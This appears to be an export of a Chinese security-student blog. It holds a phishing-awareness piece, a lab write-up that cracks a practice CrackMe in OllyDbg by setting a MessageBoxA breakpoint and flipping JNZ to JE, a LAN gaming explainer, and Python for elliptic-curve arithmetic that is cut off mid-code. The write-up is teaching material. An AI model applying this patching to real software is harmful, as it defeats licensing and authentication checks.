alt=""><br><strong>什么，居然登录进去了，钓鱼网站石锤啊。</strong></p><p>不得不感叹，这一步步的诱导操作实在是妙，以假乱真的网页，精妙的跳转，让人<strong>防不胜防</strong>。<br><br></p><h2 id="2-QQ空间异常留言（来自网友的例子）"><a href="#2-QQ空间异常留言（来自网友的例子）" class="headerlink" title="2.QQ空间异常留言（来自网友的例子）"></a>2.QQ空间异常留言（来自网友的例子）</h2><p>小学同学，在我空间留言，给我发了<strong>回忆录</strong><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607093825438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>我趁热点开，进入到一个QQ登录界面<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607075952174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>输入了密码，结果发现<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607080043423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>心里骂了那个小学同学，突然感觉不对劲，结果出现<font color='red'> <strong>异常登录</strong></font></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607080211543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><strong>解析一下源代码，发现</strong><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607080305218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><strong>防不胜防啊！！！！</strong><br><br><br></p><h1 id="03-防范措施"><a href="#03-防范措施" class="headerlink" title="03 防范措施"></a>03 防范措施</h1><p>盗号者，如此狡诈。老实的我们该如何防范呢？没关系，我告诉你</p><h2 id="1-养成良好的上网习惯"><a href="#1-养成良好的上网习惯" class="headerlink" title="1.养成良好的上网习惯"></a>1.养成良好的上网习惯</h2><p>就钓鱼网站来说，简单来说，<strong>钓鱼网站就是个“李鬼”</strong>，这个网站里的页面信息装的和真的网站相差无比，但是他的后台数据是假的，他只将你的用户名密码记录下来，然后再帮你跳转到真的网站。</p><p>甚至有些<strong>不敬业的钓鱼网站</strong>，当你输入用户名、密码后，该网站就直接罢工，什么反应都么有了。</p><p>钓鱼网站最大的危害就是盗取你的用户名和密码</p><p>所以我们该怎么做呢？</p><p><strong>首先观察域名，到底官方域名是不是一样的</strong></p><p><strong>其次，看看https网站有没有绿色小锁</strong><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020060708135032.png#pic_center" alt=""><br><strong>最后，如果你的密码已经泄露了，请尽快冻结自己的账号，然后迅速改密码，防止自己账户中的重要信息泄露</strong></p><p>其实钓鱼网站最常见的是游戏领域上的，比如购买点券、游戏币、皮肤之类的，这个时候它会比官方给的价格低很多。比如官方皮肤89块钱，钓鱼网站上只需要40块钱，你就想着试试看，输入了账号密码，结果被盗号了，你啥都没有了。<strong>还有就是之前我小时候不懂事，玩穿越火线的时候，兴致冲冲去刷枪网站刷枪，到现在为止，我的那个qq账号还是黑名单状态。</strong><br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607081452891.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br><br></p><h2 id="2-事后补救措施"><a href="#2-事后补救措施" class="headerlink" title="2.事后补救措施"></a>2.事后补救措施</h2><p>1、举报钓鱼网站</p><p>2、立即更改账号密码，因为你手机在身上，改密码对你来说还是比较简单的</p><p><br><br></p><h1 id="04-简单小结"><a href="#04-简单小结" class="headerlink" title="04 简单小结"></a>04 简单小结</h1><p>总体来说，其实所谓的<strong>黑客盗号</strong>，他并不是通过所谓的密码学来分析你的密码，破解你的密码的。</p><p>　<font color='red'> 它往往是通过钓鱼网站、钓鱼WIFI来获得了你微信登陆授权、或者一个平台的用户名、密码。 </font></p><p>面对这种骇客盗号，我们养成良好的上网习惯，才是我们的制胜法宝</p><p>所以请做到：</p><p><strong>1、但凡登录账号务必看一下域名是否有异常</strong></p><p><strong>2、不要乱扫二维码</strong></p><p><strong>3、被盗号后及时通过手机修改密码</strong></p><p><br><br><br><br>最后，如果本文对你有所帮助，<strong>希望可以点个赞支持一下</strong>。你们的鼓励将会是博主原创的动力，蟹蟹呀</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科普 </tag>
            
            <tag> 盗号 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向分析——破解一个CrackMe</title>
      <link href="/2020/07/20/ni-xiang-fen-xi-po-jie-yi-ge-crackme/"/>
      <url>/2020/07/20/ni-xiang-fen-xi-po-jie-yi-ge-crackme/</url>
      
        <content type="html"><![CDATA[<p> <font color='blue'> 点赞后看，养成习惯<br>喜欢的话 可以点个关注哟<br>你们的点赞支持对博主们来说很重要哦 ！！！<br></font><br>@<a href="为方便您的阅读，可点击下方蓝色字体，进行跳转↓↓↓">TOC</a><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630185554505.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><h2 id="00-前情提要"><a href="#00-前情提要" class="headerlink" title="00 前情提要"></a>00 前情提要</h2><p>该CrackMe是我本学期，计算机病毒老师给出的实验题，通过学习看雪论坛技术教程帖子以及请教大牛同学，收获了一些关于逆向分析的要点。现将分析笔记列出。<br><br><br></p><h2 id="01-题目描述"><a href="#01-题目描述" class="headerlink" title="01 题目描述"></a>01 题目描述</h2><p>CrackMe，即破解我的意思，鼠标右键点击属性查看详细信息，<font color='blue'>初步判断该可执行文件是一个用来练习破解的软件。</font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630184624631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><br>双击打开CrackMe，软件显示如下图所示：<p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630184634946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br><br></p><h2 id="02-破解步骤"><a href="#02-破解步骤" class="headerlink" title="02 破解步骤"></a>02 破解步骤</h2><p>1、根据难度提示信息，发现可以采用<font color='red'>暴力破解</font>破解该密码，沿着这个思路走，先尝试常用的弱口令进行登录。</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630184658664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>    <img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630184708246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>多次尝试无效后，尝试其他思路。</p><br><p>2、<font color='blue'>既然弱密码尝试无效，那我们尝试crack它。</font>逆向分析的时候，我们首先查看<font color='red'>该软件是否加壳</font>，在这里我们使用从吾爱破解论坛上下载的查壳利器——Exeinfo PE。</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630184717966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br>打开查壳软件，软件页面显示如下：</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630184734153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>将CrackMe文件载入Exeinfo PE中，得到如下信息<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630184742179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>分析查壳结果可知，该CrackMe没有加壳，编写语言是Microsoft Visual C++ 9.0 - Visual Studio 2008 (E8)</p><br>3、根据上述所得信息:<font color='blue'>因为软件没有加壳，自然我们就不用对软件进行脱壳处理。所以我们直接使用OD对CrackMe进行分析。</font>打开OD软件初始化界面如下：<p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630184754136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><br>载入CrackMe文件信息后，软件显示如下图所示<p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630184803365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><br>接下来，我们关注左上角这个大框框，它的名字叫反汇编窗口，意思就是这个程序已经被反汇编了，代码都在这里。<p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630184815808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>紧接着我们进行，断点调试</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630184827930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><br><p>然后在反汇编窗口右键查找，选择查询文本、字符串内容</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020063018484082.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>查找结果如下<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630184851304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>红色字条上一条双击，然后就回到了反汇编窗口，并且光标停留在了一条语句上，鼠标滚轮向上滚几行，然后，就看到了，CrackMe的相关代码。</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630184906735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>观察相应代码，试图了解程序执行流，<font color='red'>并经过汇编方式重新定义判断条件，使得无论输入密码为真还是为假，条件判断为永真式。</font></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630184920819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>尝试多次无效后，请教同学，发现是<font color='red'>自己的文本信息找错位置了，</font>我们可以通过插件万能API断点定位来找到相对应的位置（以下截图来自大牛同学）</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630214553523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br>单步步过查看堆栈信息<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630214621416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>溯源堆栈信息 找不到 定位不到父程序 关键断点<br>对话框断点-MessageBoxA：<br>OD 执行bpx MessageBoxA命令设置断点<br>观察堆栈返回的信息<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630214648829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>对话框MessageBoxA函数返回的参数为<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630214704625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>Retn返回后到这个位置<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630214722789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>然后，将JNZ改成JE,也就是置反，但是这样改的话等到<font color='red'>你输入了正确的验证码却会出现错误的提示，输入错误的验证码就提示正确<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630214802908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>保存保存修改后的文件<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630215115815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><p>输入任意密码，提示密码正确<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200630185021153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br><strong>以上文章，作为自己的学习笔记，仅供参考</strong></p><p>本文完，感谢你的阅读！！！</p><p>最后，如果本文对你有所帮助，<strong>希望可以点个赞支持一下</strong>。你们的鼓励将会是博主原创的动力。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200616063600946.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>局域网游戏联机原理解析</title>
      <link href="/2020/07/20/ju-yu-wang-you-xi-lian-ji-yuan-li-jie-xi/"/>
      <url>/2020/07/20/ju-yu-wang-you-xi-lian-ji-yuan-li-jie-xi/</url>
      
        <content type="html"><![CDATA[<p>@<a href="为方便您的阅读，可戳下方蓝色字体快速跳转">TOC</a></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h1 id="00-前情提要"><a href="#00-前情提要" class="headerlink" title="00 前情提要"></a>00 前情提要</h1><p>十几年前，在那个互联网并不普及的时代，若是有机会你经过一个网吧，你会经常性的看的一个场景。只见网吧里，一排排大屁股的电脑，一条条交叉的线路，一个个插座上七弯八拐的走线，一群赤裸着上半身神情专注的少年们在哪里释放着他们的青春。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200602191308798.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>而你走进一看，你大概率会发现他们中大多数玩的是红警、CS，以及后来的魔兽。</p><p>也见，他们呼朋唤友，来来往往的客人里，经常几个人约着一起打把红警、CS，红警里的谭雅、CS里的CT，这是属于他们的青春。</p><p>而这个时候，我的脑海里就产生了一个疑惑：<strong>两个不同电脑里的角色怎么就能够一起玩了呢？是用电线给他们连接到一起得嘛？</strong><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200602191319139.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>这个问题，当我学习了计算机网络课程后，豁然开朗</p><h1 id="01-通俗解释"><a href="#01-通俗解释" class="headerlink" title="01 通俗解释"></a>01 通俗解释</h1><p>当你在局域网开启一个联机游戏的时候，会在自己的主机上自动开启一个<strong>特定的监听端口</strong>，并且也会<strong>扫描当前局域网下开启了该端口的主机</strong>，就这样，你就快速找到了可以一起联机游戏的主机</p><p>可以打个比方，如果把局域网比作一个<strong>街道</strong>的话，电脑就是街道上的<strong>一户人家</strong>，则电脑的端口就是这户人家通往这个街道的<strong>其中一个门口</strong>。当我们开启一个联机游戏的时候，就好比<strong>往一个特定门口派出去一个拿着红旗子的孩子站岗</strong>。这个孩子，干了两件事情。</p><p>一是<strong>摇红旗</strong>，告诉大家我这道门开着，欢迎大家来找我玩<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200602191330849.jpg#pic_center" alt=""><br>二是<strong>观察街道</strong>的情况，如果也有人在特定的门口摇红旗的话，就告诉家里人<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020060219133969.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>就这样，街道里的人就知道，如果要想找人玩，那就找有摇红旗子的人玩。<br><br><br></p><h1 id="02-举个栗子"><a href="#02-举个栗子" class="headerlink" title="02 举个栗子"></a>02 举个栗子</h1><p><strong>以游戏红色警戒联机为例</strong>：<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200602191346744.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><strong>1.观察可联机对象</strong></p><p>红色警戒是通过TCP/UDP协议进行数据发送的：每台电脑<strong>监听</strong>一个<strong>固定的UDP端口</strong>(比如12345)，一旦其他电脑打开局域网联机游戏，这台电脑就向整个局域网所有的电脑的12345端口<strong>广播</strong>说“我可以来联机游戏，快来找我吧”的信息，这样，其他电脑接收到这个信息,就知道有电脑可以联机游戏</p><p><strong>2.加入联机游戏</strong></p><p>红警在局域网联机游戏过程中使用的是<strong>TCP协议</strong>，每个玩家对应一个连接。在真正的局域网中，当有电脑A和电脑B进行联机游戏时，电脑A会使用TCP请求和电脑B进行连接，（地址从UDP中获得，端口是固定的12345），如果主机B答应此连接，就会发送些数据(地图信息，其他玩家信息等)，这样电脑A的玩家就加入了游戏，此后两电脑就使用这个TCP连接通讯。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200602191401888.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><h1 id="03-延伸思考"><a href="#03-延伸思考" class="headerlink" title="03 延伸思考"></a>03 延伸思考</h1><p>在上文中，我们知道了局域网联机是如何进行的，那么接下里我们可以延伸思考一下，<strong>对战平台是怎么联机的呢？</strong><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200602191410762.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>你身处上海，我身处北京，并不是处于一个局域网，那为什么可以通过对战平台来一起打一把魔兽呢？</p><p>这里啊，我们可以打个比方，我们不再是门口挥舞旗子的小孩子啦，我们长大了。<strong>我们走出房门，一起找了个网吧，到了网吧里，连上了一个局域网，就可以开心的联机咯。</strong></p><p><strong>对，实际上对战平台，就是相当于提供了一个中间平台，一个虚拟局域网。这样就可以让联机的双方都能接入一个虚拟局域网，这这个虚拟局域网下，就相当于在局域网内联机了。</strong></p><p><br><br></p><h1 id="04-简单总结"><a href="#04-简单总结" class="headerlink" title="04 简单总结"></a>04 简单总结</h1><p>来简单总结一下，</p><p><strong>局域网内是如何联机的呢？</strong><br>当你开启一个联机游戏的时候，会在自己的主机上自动开启一个特定的监听端口，并且也会扫描当前局域网下开启了该端口的主机，就这样，你就快速找到了可以一起联机游戏的主机</p><p><strong>对战平台是如何联机的呢？</strong><br>实际上对战平台，就是相当于提供了一个中间平台，让联机的双方都能接入一个虚拟局域网，这这个虚拟局域网下，就相当于在局域网内联机了</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 局域网联机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python——验证椭圆曲线加密点乘运算</title>
      <link href="/2020/07/20/python-yan-zheng-tuo-yuan-qu-xian-jia-mi-dian-cheng-yun-suan/"/>
      <url>/2020/07/20/python-yan-zheng-tuo-yuan-qu-xian-jia-mi-dian-cheng-yun-suan/</url>
      
        <content type="html"><![CDATA[<h2 id="00-前情提要"><a href="#00-前情提要" class="headerlink" title="00 前情提要"></a>00 前情提要</h2><p>最近处于期末复习阶段，对于现代密码学这门学科来说，计算椭圆曲线加密的时候肯定得进行点乘运算。而这点乘运算呢，其实说难也不难，就是系数较大的时候，计算量比较大，得细心点。</p><p>而为方便检验自己的笔算结果呢，这里使用一个简单的python程序验证生点乘运算结果的正确性。<br><br><br></p><h2 id="01-实现背景"><a href="#01-实现背景" class="headerlink" title="01 实现背景"></a>01 实现背景</h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200703142901953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><h2 id="02-实现源码"><a href="#02-实现源码" class="headerlink" title="02 实现源码"></a>02 实现源码</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">ny</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#求乘法逆元</span>    k<span class="token operator">=</span><span class="token number">1</span>    e<span class="token operator">=</span>e<span class="token operator">%</span>z    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>e<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        k<span class="token operator">=</span>k<span class="token operator">+</span><span class="token number">1</span>    d<span class="token operator">=</span>int<span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span>e<span class="token punctuation">)</span>    <span class="token keyword">return</span> d<span class="token keyword">def</span> <span class="token function">myfmod</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#求分数的模</span>    a<span class="token operator">=</span>a<span class="token operator">%</span>c    d<span class="token operator">=</span><span class="token punctuation">(</span>a<span class="token operator">*</span>ny<span class="token punctuation">(</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>c    <span class="token keyword">return</span> d<span class="token keyword">def</span> <span class="token function">muchG</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>p<span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#同G</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span>pow<span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>a<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>y<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        L<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span>pow<span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>a<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>p    <span class="token keyword">else</span><span class="token punctuation">:</span>        L<span class="token operator">=</span>myfmod<span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span>pow<span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>a<span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>y<span class="token punctuation">,</span>p<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"斜率L=%d"</span><span class="token operator">%</span> L<span class="token punctuation">)</span>    x3<span class="token operator">=</span> <span class="token punctuation">(</span>pow<span class="token punctuation">(</span>L<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token operator">%</span>p    y3<span class="token operator">=</span> <span class="token punctuation">(</span>L<span class="token operator">*</span><span class="token punctuation">(</span>x<span class="token operator">-</span>x3<span class="token punctuation">)</span><span class="token operator">-</span>y<span class="token punctuation">)</span><span class="token operator">%</span>p    <span class="token keyword">return</span> x3<span class="token punctuation">,</span>y3<span class="token keyword">def</span> <span class="token function">diffG</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span>y1<span class="token punctuation">,</span>x2<span class="token punctuation">,</span>y2<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#异G</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>y2<span 